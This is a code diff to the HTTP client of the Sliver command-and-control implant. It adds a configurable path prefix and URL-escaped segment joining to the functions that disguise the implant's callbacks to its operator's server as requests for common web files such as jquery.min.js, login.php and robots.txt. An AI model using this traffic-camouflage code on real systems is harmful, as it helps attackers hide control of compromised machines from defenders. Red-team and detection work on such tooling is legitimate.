@@ -48,7 +48,6 @@ import (
 	"net"
 	"net/http"
 	"net/url"
-	"path"
 	"time"
 
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
@@ -64,9 +63,10 @@ const (
 )
 
 // HTTPStartSession - Attempts to start a session with a given address
-func HTTPStartSession(address string) (*SliverHTTPClient, error) {
+func HTTPStartSession(address string, pathPrefix string) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
 	client = httpsClient(address, true)
+	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
 	if err != nil {
 		// If we're using default ports then switch to 80
@@ -85,6 +85,7 @@ func HTTPStartSession(address string) (*SliverHTTPClient, error) {
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
 	Origin     string
+	PathPrefix string
 	Client     *http.Client
 	ProxyURL   string
 	SessionKey *AESKey
@@ -288,11 +289,21 @@ func (s *SliverHTTPClient) Send(data []byte) error {
 	return nil
 }
 
+func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
+	for index, segment := range segments {
+		segments[index] = url.PathEscape(segment)
+	}
+	if s.PathPrefix != "" {
+		segments = append([]string{s.PathPrefix}, segments...)
+	}
+	return strings.Join(segments, "/")
+}
+
 func (s *SliverHTTPClient) jsURL() string {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{"js", "static", "assets", "dist", "javascript"}
 	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
-	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
@@ -300,7 +311,7 @@ func (s *SliverHTTPClient) jspURL() string {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{"app", "admin", "upload", "actions", "api"}
 	filenames := []string{"login.jsp", "admin.jsp", "session.jsp", "action.jsp"}
-	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
@@ -308,7 +319,7 @@ func (s *SliverHTTPClient) phpURL() string {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{"api", "rest", "drupal", "wordpress"}
 	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
-	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
@@ -316,7 +327,7 @@ func (s *SliverHTTPClient) txtURL() string {
 	curl, _ := url.Parse(s.Origin)
 	segments := []string{"static", "www", "assets", "text", "docs", "sample"}
 	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
-	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames))
 	return curl.String()
 }
 
